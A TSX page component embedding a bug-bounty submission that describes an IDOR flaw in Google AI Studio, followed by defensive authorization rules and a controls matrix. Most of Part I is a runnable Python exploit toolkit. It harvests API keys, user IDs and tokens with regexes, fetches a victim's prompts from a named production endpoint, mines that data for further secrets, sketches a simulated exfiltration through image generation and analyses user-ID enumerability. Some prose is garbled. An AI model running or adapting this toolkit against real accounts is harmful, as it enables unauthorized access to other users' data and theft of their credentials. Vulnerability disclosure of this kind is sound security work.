// components/pages/ManifestoPage.tsx
import React, { useState, useEffect } from 'react';
import { Card } from '../common/Card';
import { CodeBlock } from '../common/CodeBlock'; // For Python code in Manifesto Part I

// Helper function to simulate fetching markdown content
// In a real app, this might be an actual fetch call or import
const fetchMarkdownContent = async (path: string): Promise<string> => {
  // Simulate fetching. Replace with actual fetch if files are served.
  // For this simulation, we'll return pre-defined content based on path.
  // This is a simplified approach. Ideally, you'd fetch .md files.
  if (path === 'manifesto/00_preamble.md') {
    return `# VRP Submission: The Unabridged & Unified Security Architecture Manifesto

**To:** Google Trust & Safety Team
**From:** David Amber “WebDUH LLC” Weatherspoon (reconsumeralization@gmail.com)
**Subject:** CRITICAL (P0) - Unified Manifesto: The Logical, Practical, and Strategic Analysis of a Full-Chain Compromise in AI Studio (Issue #423273488)

## Preamble:

This document is the definitive and complete analysis of a critical security vulnerability chain in Google AI Studio. It is structured as a single, unified manifesto, presenting a closed loop of argumentation from formal logic to practical code, from impact analysis to proactive architectural principles. Each component is designed to be independently verifiable while reinforcing the validity of the whole, demonstrating a systemic flaw that requires a systemic solution.

The core principle is **Security as a Self-Validating System**. The system consists of three components. The validity of each component is proven by greater than the sum of its parts.

*   **Component α (Alpha) - The Adversarial Validation Engine:** The "Offense." A tool that executes attacks to test the system's claims.
*   **Component β (Beta) - The Authorization Blueprint:** The "Defense Blueprint." A set of formal rules that define what a secure system *must* do.
*   **Component γ (Gamma) - The Proactive Defense Matrix:** The "Next-Gen Defense." A layer of advanced security controls that protect against future threats.

The interplay is simple: The Adversarial Engine (α) is run against the system. If the system's behavior violates the Blueprint (β), the vulnerability is proven. If the Proactive Defenses (γ) stop the Engine (α), the solution is proven.

This manifesto aims to provide not just a bug report but a complete security case study—demonstrating the flaw, its logical root, and a clear, forward-thinking path to remediation. Its validity is inherent in the structure of the proof itself.
`;
  }
  if (path === 'manifesto/01_part_i_the_finding.md') {
    return `## Part I: The Finding — The "What Is"

This section details the specific, provable vulnerability.

### 1.1. Executive Summary

A critical server-side Broken Object Level Authorization (BOLA/IDOR) flaw in the AI Studio backend allows any authenticated user to access the private data of all other users. This is enabled by the client-side exposure of static API keys and predictable User IDs. The vulnerability is not theoretical; it is demonstrably exploitable and can be chained to abuse other AI services for stealthy data exfiltration, representing a full break of the multi-tenant security model.

### 1.2. The Logical Proof ("The Math")

The security failure is proven by the following formal argument:

*   **P1: Static Key Exposure:** The client is served a static API Key, \`K_STATIC\`.
*   **P2: User ID Exposure:** The client is served the current user's unique identifier, \`ID_USER\`.
*   **P3: Endpoint Exposure:** The client is served the backend API endpoint, \`URL_API\`.
*   **P4: Predictable Resource Path:** The API uses a standard pattern: \`.../users/{ID_USER}/resource\`.

**Security Model Axiom:** A secure system MUST execute \`Authorize(Session_User, Resource_Owner)\` to verify permission.

**Conclusion (Q.E.D.):** The backend correctly executes \`Authenticate(K_STATIC)\` but FAILS to execute the \`Authorize\` check, returning data for any valid \`ID_USER\` to any session authenticated with \`K_STATIC\`.

### 1.3. The Code Proof ("The Unabridged PoC Toolkit" - Component α)

This single, self-contained Python script is the practical embodiment of the entire analysis. It finds the secrets, executes the logical proof, demonstrates the chained attack, and provides the data for the scalability analysis.
(Note: Within the VTF application, this script's logic is simulated on the "PoC Development" page, using the "Definitive & Unified PoC Toolkit" template. The script below is the full version for external execution and VRP evidence.)

${"```python"}
# =================================================================================================
# COMPONENT ALPHA: THE ADVERSARIAL VALIDATION ENGINE
# VRP SUBMISSION: UNIFIED PROOF-OF-CONCEPT FOR GOOGLE AI STUDIO (MAKERSUITE)
# VULNERABILITY:  Critical IDOR Chained with Data Exfiltration & Scalable ID Enumeration Analysis
# REPORTER:       David Amber “WebDUH LLC” Weatherspoon
# VRP ISSUE:      #423273488
#
# This single script is the engine of proof. It automates discovery, provides logical
# proof steps, demonstrates the primary IDOR, shows a chained exfiltration vector,
# and includes statistical ID analysis.
#
# USAGE: python Unified-Exploit-Full-Chain.py --help (for all options)
# Requires: pip install requests pandas numpy matplotlib seaborn
# =================================================================================================

import re
import json
import itertools
import argparse
import requests # type: ignore
import pandas as pd # type: ignore
import numpy as np # type: ignore
import matplotlib.pyplot as plt # type: ignore
import seaborn as sns # type: ignore
from typing import Dict, List, Any, Tuple, Optional

class Ansi: G, Y, R, M, C, GR, E, B = '\\033[92m', '\\033[93m', '\\033[91m', '\\033[95m', '\\033[96m', '\\033[90m', '\\033[0m', '\\033[1m'

class SecretHunterMixin:
    _PATTERNS = {
        "GoogleAPIKey": re.compile(r'AIza[0-9A-Za-z_\\-]{35}'),
        "GoogleUserID": re.compile(r'\\b\\d{21}\\b'),
        "InternalEndpoint": re.compile(r'https://[A-Za-z0-9.\\-]+clients6\\.google\\.com[^\\s"\'\`]*'),
        "OAuthClientID": re.compile(r'\\d{12,}\\-[0-9a-z]{32}\\.apps\\.googleusercontent\\.com'),
        "Email": re.compile(r'[A-Za-z0-9._%+\\-]+@[A-Za-z0-9.\\-]+\\.[A-Za-z]{2,}'),
        "SessionLikeToken": re.compile(r'\\bAJVUC[0-9A-Za-z:_\\-]{20,}\\b')
    }
    def _redact(self, s: str) -> str: return f"{s[:6]}...{s[-4:]}" if len(s) > 10 else s
    def classify_blob(self, content: str) -> Dict[str, Any]:
        results: Dict[str, Any] = {}
        all_redacted_collector: Dict[str, List[str]] = {}

        for label, rx in self._PATTERNS.items():
            matches = list(dict.fromkeys(m.group(0) for m in rx.finditer(content))) # Unique matches
            if matches:
                results[f"{label}_Full"] = matches[0] # Store the first full match
                all_redacted_collector[label] = [self._redact(m) for m in matches]
        
        if all_redacted_collector:
            results["All_Redacted"] = all_redacted_collector
        return results

class SecondarySecretExtractorMixin:
    _PATTERNS = {
        "LikelyAPIKey": re.compile(r'(?:sk|pk|rk|api_key(?:_secret)?[\s:=]+)[\'"]?([a-zA-Z0-9_\\-]{16,64})[\'"]?'),
        "BearerToken": re.compile(r'Bearer\\s+([A-Za-z0-9\\-\\._~\\+\\\\/]+=*)')
    }
    def _redact(self, s: str) -> str: return f"{s[:6]}...{s[-4:]}" if len(s) > 10 else s
    def extract_secrets(self, content: str) -> List[Dict[str,str]]:
        found = []
        for label, rx in self._PATTERNS.items():
            for m in rx.finditer(content):
                val = m.group(1) if m.groups() and m.group(1) else m.group(0)
                found.append({"type": label, "value": val, "redacted": self._redact(val)})
        return found

class IdAnalysisMixin:
    def analyze_ids(self, ids: List[str], plot: bool=True) -> None:
        print(f"\\n{Ansi.B}--- Appendix A: User-ID Statistical Enumerability Analysis ---{Ansi.E}")
        valid_ids = [s for s in ids if s and s.isdigit() and len(s) > 12]
        if len(valid_ids) < 2:
            print(f"{Ansi.Y}[WARN] Need at least 2 valid numeric User IDs for analysis.{Ansi.E}")
            return
        
        df = pd.DataFrame(valid_ids, columns=["UserID"])
        df['Last3'] = df['UserID'].str[-3:].astype(int)
        df['First4'] = df['UserID'].str[:4].astype(int)
        
        print(f"\\n[*] Analyzing sample of {len(df)} IDs...")
        if plot:
            try:
                plt.figure(figsize=(14, 7))
                plt.suptitle("User ID Distribution Analysis", weight='bold')
                plt.subplot(1, 2, 1)
                sns.histplot(df['First4'], bins=min(20, df['First4'].nunique()), kde=True)
                plt.title("First 4 Digits")
                plt.subplot(1, 2, 2)
                sns.histplot(df['Last3'], bins=min(20, df['Last3'].nunique()), kde=True)
                plt.title("Last 3 Digits")
                print(f"{Ansi.G}[INFO] Plot window opened. Close it to continue.{Ansi.E}")
                plt.show()
            except Exception as e:
                print(f"{Ansi.Y}[WARN] Plotting failed. Matplotlib/Seaborn or GUI backend missing? Error: {e}{Ansi.E}")
        
        self._run_monte_carlo(set(valid_ids))

    def _run_monte_carlo(self, victims: set, trials: int=10000, id_len: int=21, guess_digits: int=9) -> None:
        space_size=10**guess_digits
        suffixes={int(v[-guess_digits:]) for v in victims if isinstance(v, str) and v.isdigit() and len(v)==id_len}
        
        if not suffixes:
            print(f"{Ansi.Y}[WARN] No IDs of length {id_len} with {guess_digits} numeric suffix found for Monte Carlo.{Ansi.E}")
            return
            
        print(f"\\n[*] Running Monte Carlo simulation (guessing {guess_digits}-digit suffixes)... Target suffix count: {len(suffixes)}")
        results_data = []
        for bs in [100, 1000, 10000, 100000]: # Batch sizes for guessing
            hits = 0
            for _ in range(trials):
                guesses = np.random.randint(0, space_size, size=bs)
                if not suffixes.isdisjoint(guesses):
                    hits += 1
            probability = (hits / trials) * 100
            results_data.append({"Batch_Size": f"{bs:,}", "Prob_of_Hit": f"{probability:.4f}%"})
        
        if results_data:
            print(pd.DataFrame(results_data).to_string(index=False))
        else:
            print(f"{Ansi.Y}[INFO] No Monte Carlo results to display.{Ansi.E}")


class UnifiedPocTool(SecretHunterMixin, SecondarySecretExtractorMixin, IdAnalysisMixin):
    PROMPTS_PATH = "/_/MakerSuite/v1/users/{USER_ID}/prompts"
    IMG_PATH = "/v1beta/models/gemini-pro-vision:generateContent" # Example, may vary

    def __init__(self, **kwargs: Any):
        self.api_key: Optional[str] = None
        self.attacker_id: Optional[str] = None
        self.victim_id: Optional[str] = None
        self.endpoint: Optional[str] = None
        self.wiz_file: str = "wiz_data.json"
        self.ids_for_analysis: List[str] = []
        self.__dict__.update(kwargs)

    def print_step(self, label: str, desc: str, tech: str = "") -> None:
        print(f"\\n{Ansi.C}{Ansi.B}[STEP {label}]{Ansi.E}\\n  {desc}")
        if tech: print(f"  {Ansi.GR}Technical: {tech}{Ansi.E}")

    def _make_api_request(self, url: str, method: str = "GET", payload: Optional[Dict[str,Any]] = None) -> Tuple[Optional[str], int]:
        headers = {"X-Goog-Api-Key": self.api_key, "User-Agent": "AI-VRP-PoC/2.0", "Content-Type": "application/json"}
        try:
            if method.upper() == "GET":
                response = requests.get(url, headers=headers, timeout=15)
            elif method.upper() == "POST":
                response = requests.post(url, headers=headers, json=payload, timeout=25)
            else:
                return f"Unsupported method: {method}", -2
            
            return response.text, response.status_code
        except requests.RequestException as e:
            return str(e), -1

    def test_idor_prompts(self, user_id_to_target: str, is_victim_test: bool = False) -> Tuple[bool, str, int]:
        if not self.endpoint or not self.api_key: return False, "Endpoint or API key not set", -1
        
        url = self.endpoint + self.PROMPTS_PATH.format(USER_ID=user_id_to_target)
        test_label = f"{Ansi.Y}VICTIM's ({user_id_to_target}){Ansi.E}" if is_victim_test else f"{Ansi.Y}ATTACKER's own ({user_id_to_target}){Ansi.E}"
        print(f"  -> Testing API call for {test_label} data... ", end="", flush=True)
        
        content, status_code = self._make_api_request(url)

        if status_code == 200:
            result_color = Ansi.R if is_victim_test else Ansi.G
            message_verb = "UNAUTHORIZED ACCESS TO" if is_victim_test else "Successfully fetched"
            print(f"{result_color}{message_verb} data (HTTP 200 OK).{Ansi.E}")
            return True, content or "", status_code
        elif status_code == 403: print(f"{Ansi.G if is_victim_test else Ansi.Y}Access Denied (HTTP 403 Forbidden).{Ansi.E}")
        elif status_code == 404: print(f"{Ansi.GR}Resource Not Found (HTTP 404).{Ansi.E}")
        elif status_code == 401: print(f"{Ansi.R}Authentication Failed (HTTP 401). API Key may be invalid.{Ansi.E}")
        else: print(f"{Ansi.Y}Unexpected HTTP Status ({status_code}). Response: {content[:100] if content else ''}{Ansi.E}")
        return False, content or "", status_code

    def exfiltrate_via_image_gen(self, secret_to_embed: str) -> Optional[str]:
        if not self.endpoint or not self.api_key: return None
        
        url = self.endpoint + self.IMG_PATH # Ensure this path is correct for your target
        embeddable_secret = secret_to_embed[:250] + "..." if len(secret_to_embed) > 253 else secret_to_embed
        # Example for Gemini Pro Vision - may need adjustment for other models
        payload = {"contents": [{"parts": [{"text": f"Render this exact string as large, clear, white text on a black background: '{embeddable_secret}'"}]}]}
        
        print(f"  -> Crafting image generation prompt to embed secret: {Ansi.GR}'{self._redact(embeddable_secret)}'{Ansi.E}")
        print(f"  -> {Ansi.M}SIMULATING{Ansi.E} POST to generative AI endpoint: {url.split('?')[0]}...") # Clean URL for display
        
        # Simulate the call. In a real scenario, you'd make the POST request:
        # content, status_code = self._make_api_request(url, method="POST", payload=payload)
        # For simulation, we just craft a fake URL.
        # if status_code == 200 and content and "candidates" in content: ... parse for image data ...

        print(f"     {Ansi.GR}Simulated response: Image containing secret would be generated and accessible.{Ansi.E}")
        return f"https://storage.googleapis.com/sim_exfil_{self._redact(embeddable_secret)}.png_SIMULATED"

    def run_hunt_mode(self) -> None:
        self.print_step("DISCOVERY", "Parsing WIZ_global_data to find secrets (P1, P2, P3).")
        try:
            with open(self.wiz_file, 'r', encoding='utf-8') as f: wiz_content = f.read()
            secrets = self.classify_blob(wiz_content)
            print(f"{Ansi.B}\\nDiscovered Potential Secrets in \`{self.wiz_file}\`:{Ansi.E}")
            print(json.dumps(secrets.get("All_Redacted", {"Note": "No secrets matching defined patterns found."}), indent=2))
            
            print(f"\\n{Ansi.GR}Summary for Exploit Mode Arguments (if needed):{Ansi.E}")
            self.api_key = secrets.get('GoogleAPIKey_Full')
            self.attacker_id = secrets.get('GoogleUserID_Full')
            self.endpoint = secrets.get('InternalEndpoint_Full')
            
            print(f"  --api-key     \\"{self.api_key if self.api_key else 'Not Found'}\\"")
            print(f"  --attacker-id \\"{self.attacker_id if self.attacker_id else 'Not Found'}\\"")
            print(f"  --endpoint    \\"{self.endpoint if self.endpoint else 'Not Found or use default'}\\"")

            if self.attacker_id: self.ids_for_analysis.append(self.attacker_id)

        except Exception as e:
            print(f"{Ansi.R}[ERROR]{Ansi.E} Could not process file \`{self.wiz_file}\`. Error: {e}")

    def run_exploit_mode(self) -> None:
        self.print_step("SETUP", "Initializing exploit with provided or extracted credentials.")
        if not all([self.api_key, self.attacker_id, self.victim_id, self.endpoint]):
            print(f"{Ansi.Y}[INFO] Core credential missing. Attempting auto-extraction from '{self.wiz_file}' for attacker details...{Ansi.E}")
            self.run_hunt_mode() # This will populate self.api_key, self.attacker_id, self.endpoint
            if not self.api_key: raise ValueError("API Key (K_STATIC) could not be determined.")
            if not self.attacker_id: raise ValueError("Attacker User ID (ID_ATTACKER) could not be determined.")
            if not self.endpoint: self.endpoint = "https://alkalimakersuite-pa.clients6.google.com"; print(f"{Ansi.Y}[INFO] Endpoint not found, using default: {self.endpoint}{Ansi.E}")
            if not self.victim_id: raise ValueError("Victim User ID (ID_VICTIM) must be provided for exploit mode.")
        
        print(f"\\n{Ansi.B}Formal Logical Proof - Setup & Premises:{Ansi.E}")
        print(f"  {Ansi.C}P1: K_STATIC (API Key){Ansi.E}: {Ansi.Y}{self._redact(self.api_key) if self.api_key else 'None'}{Ansi.E}")
        print(f"  {Ansi.C}P2: ID_USER (Attacker){Ansi.E}: {Ansi.Y}{self.attacker_id if self.attacker_id else 'None'}{Ansi.E}, {Ansi.C}(Victim){Ansi.E}: {Ansi.Y}{self.victim_id if self.victim_id else 'None'}{Ansi.E}")
        print(f"  {Ansi.C}P3: URL_API (Endpoint){Ansi.E}: {Ansi.Y}{self.endpoint if self.endpoint else 'None'}{Ansi.E}")
        print(f"  {Ansi.C}P4: Resource Path{Ansi.E}: {Ansi.Y}{self.PROMPTS_PATH.format(USER_ID='{USER_ID}')}{Ansi.E}")

        self.print_step("1: VALIDATE K_STATIC", "Test Authenticate(K_STATIC) against attacker's own resources.")
        success_attacker, _, status_attacker = self.test_idor_prompts(self.attacker_id if self.attacker_id else "", is_victim_test=False)
        if not success_attacker or status_attacker != 200:
            print(f"{Ansi.R}{Ansi.B}[STOP]{Ansi.E} Authenticate(K_STATIC) failed for attacker's own data (HTTP {status_attacker}). Cannot proceed."); return
        print(f"{Ansi.G}[SUCCESS]{Ansi.E} Authenticate(K_STATIC) is VALID. API key is LIVE (HTTP {status_attacker}).")

        self.print_step("2: PROVE IDOR", "Test Authorize(ID_ATTACKER, ID_VICTIM) - Attempt to access victim's resources.")
        success_victim, victim_content, _ = self.test_idor_prompts(self.victim_id if self.victim_id else "", is_victim_test=True)
        
        if success_victim and victim_content:
            print(f"{Ansi.G}[CRITICAL]{Ansi.E} {Ansi.R}IDOR CONFIRMED.{Ansi.E} Successfully accessed victim ({Ansi.Y}{self.victim_id}{Ansi.E}) data using attacker's session/key.")
            print(f"  {Ansi.GR}Sample of exfiltrated data (first 200 chars): {victim_content[:200]}...{Ansi.E}")
            
            self.print_step("3: CHAINED ATTACK - SECONDARY EXFILTRATION", "Analyze exfiltrated data for more secrets and simulate further exploit.")
            secondary_secrets = self.extract_secrets(victim_content)
            if not secondary_secrets:
                print(f"  {Ansi.Y}[INFO]{Ansi.E} No specific secondary secrets found via regex. Simulating one for PoC.")
                secondary_secrets.append({"type": "SimulatedProjectSecret", "value": f"PROJECT_XYZ_VICTIM_{self.victim_id[:5] if self.victim_id else 'NODATA'}", "redacted": self._redact(f"PROJECT_XYZ_VICTIM_{self.victim_id[:5] if self.victim_id else 'NODATA'}")})
            
            for secret_info in secondary_secrets:
                print(f"  -> Found potential secondary secret ({Ansi.Y}{secret_info['type']}: {secret_info['redacted']}{Ansi.E}).")
                print(f"  [*] Pivoting: Attempting to exfiltrate this secret via {Ansi.M}simulated AI image generation{Ansi.E}...")
                img_url = self.exfiltrate_via_image_gen(secret_info['value'])
                if img_url: print(f"    {Ansi.G}[SUCCESS]{Ansi.E} Conceptual image exfil OK. URL: {Ansi.Y}{img_url}{Ansi.E}")
                else: print(f"    {Ansi.Y}[INFO]{Ansi.E} Conceptual image exfil attempt failed simulation.")
                break # Demonstrate with one found secret
        else:
            print(f"\\n{Ansi.Y}[INFO]{Ansi.E} Primary IDOR attempt against victim ({Ansi.Y}{self.victim_id}{Ansi.E}) was NOT successful. Chained attack (Step 3) is not demonstrated.")
        
        if self.victim_id: self.ids_for_analysis.append(self.victim_id)

def main():
    parser = argparse.ArgumentParser(description="Unified PoC Toolkit for AI Studio Vulnerabilities.", formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"{Ansi.B}Example Usages:{Ansi.E}\\n"
               f"  1. Discover secrets:  {Ansi.C}python Unified-Exploit-Full-Chain.py hunt --blob-file wiz_data.json{Ansi.E}\\n"
               f"  2. Full exploit:      {Ansi.C}python Unified-Exploit-Full-Chain.py exploit --victim-id <VICTIM_USER_ID> --wiz-file wiz_data.json{Ansi.E}\\n"
               f"  3. Exploit with manual creds: {Ansi.C}python Unified-Exploit-Full-Chain.py exploit --victim-id <VIC_ID> --api-key <KEY> --attacker-id <ATT_ID> --endpoint <URL>{Ansi.E}\\n"
               f"  4. Analyze ID list:   {Ansi.C}python Unified-Exploit-Full-Chain.py analyze-ids --id-list user1,user2,user3 --no-plot{Ansi.E}\\n"
               f"\\n{Ansi.B}For \`wiz_data.json\`:{Ansi.E} In AI Studio, open DevTools Console, type \`copy(JSON.stringify(window.WIZ_global_data))\`, paste to file."
    )
    subparsers = parser.add_subparsers(dest="mode", required=True, help="Operating mode")

    hunt_parser = subparsers.add_parser("hunt", help="Parse wiz_data.json to find secrets.")
    hunt_parser.add_argument("--blob-file", default="wiz_data.json", help="Path to WIZ_global_data JSON file.")

    exploit_parser = subparsers.add_parser("exploit", help="Run the full exploit chain.")
    exploit_parser.add_argument("--victim-id", help="Google User ID of your SEPARATE victim test account.")
    exploit_parser.add_argument("--wiz-file", default="wiz_data.json", help="Path to attacker's WIZ_global_data JSON file for auto-extraction of attacker creds.")
    exploit_parser.add_argument("--api-key", help="[Optional] Override auto-extracted API Key.")
    exploit_parser.add_argument("--attacker-id", help="[Optional] Override auto-extracted Attacker Google User ID.")
    exploit_parser.add_argument("--endpoint", help="[Optional] Override auto-extracted API Endpoint base URL.")
    
    analysis_parser = subparsers.add_parser("analyze-ids", help="Perform statistical analysis on a list of User IDs.")
    analysis_parser.add_argument("--id-list", required=True, help="Comma-separated list of User IDs for analysis.")
    analysis_parser.add_argument("--no-plot", action="store_false", dest="plot", help="Disable matplotlib/seaborn plotting.")

    args = parser.parse_args()

    print("="*80 + f"\\n  {Ansi.B}Definitive PoC for Google AI Studio - VRP Issue #423273488{Ansi.E}\\n" + "="*80)

    # Initialize tool with all args; methods will use what they need
    tool_kwargs = {k: v for k, v in vars(args).items() if v is not None}
    tool = UnifiedPocTool(**tool_kwargs)


    if args.mode == "hunt":
        tool.run_hunt_mode()
    elif args.mode == "exploit":
        if not tool.victim_id : # Check if victim_id was set (either by arg or if it was part of kwargs)
             # Try to get it from args explicitly if not in tool_kwargs from the start
             if hasattr(args, 'victim_id') and args.victim_id:
                 tool.victim_id = args.victim_id
             else:
                 parser.error("argument --victim-id is required for exploit mode.")
        tool.run_exploit_mode()
    elif args.mode == "analyze-ids":
        ids_to_analyze = [uid.strip() for uid in args.id_list.split(',')]
        tool.analyze_ids(ids_to_analyze, plot=args.plot)
    
    # If any IDs were collected during hunt/exploit and not explicitly analyzing, offer to analyze them
    if args.mode != "analyze-ids" and tool.ids_for_analysis:
        unique_collected_ids = list(dict.fromkeys(filter(None, tool.ids_for_analysis))) # Filter out Nones
        if len(unique_collected_ids) >=2 : # Only offer if we have at least two for meaningful analysis
            print(f"\\n{Ansi.GR}Collected {len(unique_collected_ids)} User IDs during operations: {', '.join(unique_collected_ids)}{Ansi.E}")
            # Default to no plot for this interactive option to avoid GUI issues in some environments
            if input(f"{Ansi.Y}Run statistical analysis on these IDs? (y/N): {Ansi.E}").lower() == 'y':
                tool.analyze_ids(unique_collected_ids, plot=True if input(f"{Ansi.Y}Enable plotting? (y/N - default N): {Ansi.E}").lower() == 'y' else False) 
        
    print("\\n" + "="*80 + f"\\n  {Ansi.B}Toolkit Execution Complete.{Ansi.E}\\n" + "="*80)

if __name__ == "__main__":
    main()
${"```"}

**Function of Component α:**
This component has three primary modes (\`hunt\`, \`exploit\`, \`analyze-ids\`) that allow it to:
1.  Discover the premises of the system (P1-P4 from the Logical Proof) by parsing \`window.WIZ_global_data\`.
2.  Execute an attack that directly tests the authorization rules (Component β).
3.  Analyze the scalability of the attack through User ID statistical analysis.
`;
  }
  if (path === 'manifesto/02_part_ii_component_beta.md') {
    return `## Part II: Component β (Beta) — The Zero-Trust Authorization Blueprint

This is the **formal specification for the defense**. It is the set of immutable rules the system MUST follow. Component α's "exploit" mode is designed to prove that the current system violates Rule #3.

### Specification:

#### Rule of Authentication (Authenticate):

1.1: The system MUST validate that any API key (\`K_STATIC\`) used for application-level requests is a valid, trusted credential.
    *   *Verification*: Done by the backend before processing the request.
    *   *VTF Simulation*: \`UnifiedPocTool.test_idor_prompts\` (when \`is_victim_test=False\`) simulates this. A 401/403 for the attacker's own data using their key would indicate a failure here.

1.2: A successful application-level authentication (e.g., via \`K_STATIC\`) DOES NOT imply user-level authorization for specific resources.
    *   *Principle*: Authentication confirms "who you are" (or "what key you have"), Authorization confirms "what you are allowed to do/see." These must be separate checks for multi-tenant resources.

#### Rule of Identification (Identify):

2.1: Every user session, when attempting to access or modify user-specific resources, MUST be strongly and reliably associated with a single, unique, non-malleable identifier for the acting user (\`ID_SESSION_USER\`).
    *   *Source*: Derived from a secure authentication token (e.g., JWT, OAuth token), not from client-supplied headers or parameters if possible.

2.2: Any user-specific resource on the backend (e.g., a user's prompt, model, or setting) MUST be owned by or unequivocally associated with a single, unique identifier (\`ID_RESOURCE_OWNER\`).

#### Rule of Authorization (Authorize):

3.1: For **every** request that targets a user-specific resource, the backend MUST perform an explicit authorization check *after* successful authentication.

3.2: This check MUST verify that \`ID_SESSION_USER\` (derived from the authenticated session) is identical to \`ID_RESOURCE_OWNER\` (associated with the resource being accessed).
    *   *Logic*: \`IF ID_SESSION_USER == ID_RESOURCE_OWNER THEN Allow ELSE Deny.\`

3.3: If \`ID_SESSION_USER != ID_RESOURCE_OWNER\`, the request MUST BE DENIED, typically with an HTTP 403 Forbidden status, regardless of the validity of \`K_STATIC\` or any other application-level authentication. **There are no exceptions for multi-tenant data.**

#### Rule of Least Privilege & Secure Design:

4.1: Client-side components (e.g., \`index.html\`, JavaScript) MUST NOT be served secrets or identifiers that are not strictly necessary for their legitimate, intended client-side operation or that grant broad, unmediated access to backend resources.
    *   *Violation Example*: Serving static, powerful API keys like \`K_STATIC\` directly to the client.

4.2: User-specific resource identifiers exposed to the client (if absolutely necessary) should ideally be opaque or session-relative, not direct, guessable, or globally applicable database keys if this can be avoided. This is a defense-in-depth measure, not a substitute for Rule #3.
`;
  }
  if (path === 'manifesto/03_part_iii_component_gamma.md') {
    return `## Part III: Component γ (Gamma) — The Proactive Defense Matrix

This is the **next-generation defense layer**. It is designed to neutralize advanced attacks, including the chained exploits demonstrated by Component α (The Adversarial Validation Engine). An updated version of Component α run against a system protected by Component γ would fail, proving the efficacy of these defenses.

### Controls Matrix:

| Threat Vector (Demonstrated by Component α)                      | Proactive Defense Control (Implemented by Component γ)                                                                  | How it Stops/Mitigates Component α's Attack                                                                                                                                                             |
| :--------------------------------------------------------------- | :---------------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Static API Key Leak (\`K_STATIC\`) leading to IDOR**             | **Action-Scoped, Short-Lived Tokens (e.g., OAuth 2.0 with strict scopes, JWTs per action)**                             | The powerful, shared \`K_STATIC\` is eliminated. The client receives temporary, narrowly scoped tokens. Component α's \`exploit\` mode fails as a token for User A cannot be used to access User B's resources. \`Authenticate\` and \`Authorize\` become tightly coupled for the specific resource access. |
| **Client-Side Exposure of User IDs (\`ID_USER\`) facilitating IDOR targeting** | **Opaque User Identifiers (Session-Relative or UUIDs for client interaction if ID must be exposed)** & Strict Adherence to Authorization Blueprint (Component β, Rule #3) | While Component β is the primary defense, using less predictable IDs makes enumeration (simulated by \`analyze-ids\` in Component α) harder. The core fix remains server-side authorization.                 |
| **Secondary Secret Exfiltration via AI Image Generation**        | **AI Data Loss Prevention (DLP) Gateway / Output Sanitization**                                                         | An egress proxy inspects AI model outputs *before* returning to the user. It scans for patterns (PII, secrets like \`sk-live-...\`, internal data formats) via regex, ML, or heuristics. Component α's \`exfiltrate_via_image_gen\` function would have its output (the image or its data) blocked or sanitized, preventing the secret from reaching the "attacker." |
| **Scalable ID Enumeration (User ID pattern analysis)**           | **UUIDv4 for User Identifiers & Granular Rate Limiting on ID-based endpoints**                                          | Replaces predictable, sequential numeric \`ID_USER\`s with non-sequential UUIDs. Component α's \`analyze-ids\` mode would find no statistical patterns. Aggressive scanning attempts are further thwarted by strict rate limits on endpoints accepting User IDs as parameters. |
| **(Future Threat) CI/CD Pipeline Compromise / Malicious Dependencies** | **Build Attestation (e.g., SLSA) & Binary Authorization & Secure Software Supply Chain Practices (Scoped Registries, Dependency Sandboxing)** | (Not directly tested by current Component α) Ensures that the deployed application code is exactly what was intended and built through a verified, untampered process. Prevents injection of backdoors or malicious code that could *create* new vulnerabilities for Component α to find. |
| **(Future Threat) Model Inversion / Advanced Adversarial AI Attacks** | **Advanced Model Monitoring, Differential Privacy in Training/Fine-tuning, Input Validation & Sanitization for Training Data** | (Beyond current Component α's direct scope) Defends the AI models themselves from more sophisticated attacks that aim to extract training data or manipulate model behavior.                                   |

**Principle of Component γ:**

Component γ assumes that Component β (The Authorization Blueprint) is implemented correctly. Gamma's role is to provide defense-in-depth against:
1.  Failures or bypasses of Component β (though β should be robust).
2.  More sophisticated attack vectors that exploit the *nature* of the services (like AI services themselves).
3.  Threats to the development and deployment lifecycle.

Implementing Component γ transforms the security posture from reactive (fixing Beta violations found by Alpha) to proactive and resilient against classes of future attacks.
`;
  }
   if (path === 'manifesto/04_part_iv_self_validating_proof.md') {
    return `## Part IV: The Self-Validating Proof — How the Components Work Together

This is the core of the submission's argument. The interaction between Components α, β, and γ provides a self-validating proof of the vulnerability and the effectiveness of the proposed architectural changes.

**The Process of Validation:**

1.  **Baseline Test - Current System vs. Component α & β:**
    *   **Action:** Execute **Component α (Adversarial Validation Engine - \`Unified-Exploit-Full-Chain.py\`)** in \`hunt\` mode against the current AI Studio system (or a faithful representation of its \`window.WIZ_global_data\`).
    *   **Expected Result (from Component α):** Successful extraction of \`K_STATIC\` (API Key), \`ID_USER\` (Attacker's User ID), and \`URL_API\` (Endpoint).
    *   **Validation against Component β (Authorization Blueprint):** This result **proves a violation of Component β's Rule #4.1** (Rule of Least Privilege & Secure Design: "Client-side components MUST NOT be served secrets... that grant broad, unmediated access..."). The premises for the attack (P1, P2, P3 from Part I) are now programmatically established.

    *   **Action:** Execute **Component α** in \`exploit\` mode, providing the \`ID_VICTIM\` (Victim's User ID) and using the credentials gathered or provided.
    *   **Expected Result (from Component α):**
        *   Step 1 (Validate \`K_STATIC\` against attacker's own resources) passes with HTTP 200.
        *   Step 2 (Attempt IDOR against \`ID_VICTIM\`'s resources) passes with HTTP 200, returning victim's data.
    *   **Validation against Component β:** This result **proves a direct violation of Component β's Rule #3.2 and #3.3** (Rule of Authorization: "check MUST verify \`ID_SESSION_USER == ID_RESOURCE_OWNER\`" and "If \`ID_SESSION_USER != ID_RESOURCE_OWNER\`, the request MUST BE DENIED"). The IDOR is undeniably validated. The system failed to \`Authorize(Session_User, Resource_Owner_ID)\` correctly.

2.  **Hypothetical Test - Secured System (with Component γ) vs. Component α:**
    *   **Scenario:** Assume the AI Studio backend has been re-architected to incorporate the controls outlined in **Component γ (Proactive Defense Matrix)**, particularly:
        *   Replacement of \`K_STATIC\` with Action-Scoped, Short-Lived Tokens.
        *   Implementation of an AI Data Loss Prevention (DLP) Gateway.
        *   Full adherence to all rules in Component β.

    *   **Action:** Execute **Component α** in \`exploit\` mode against this hypothetically secured system.
    *   **Expected Result (from Component α):**
        *   **Credential Acquisition Failure:** The \`hunt\` mode (or initial setup of \`exploit\` mode) would fail to find a persistent, powerful \`K_STATIC\`. It might find a temporary, scoped token, but this token would be insufficient for the subsequent steps.
        *   **Step 1 (Validate "Key"):** If the attacker somehow obtained a temporary token for their own session, this might pass for *their own* resources.
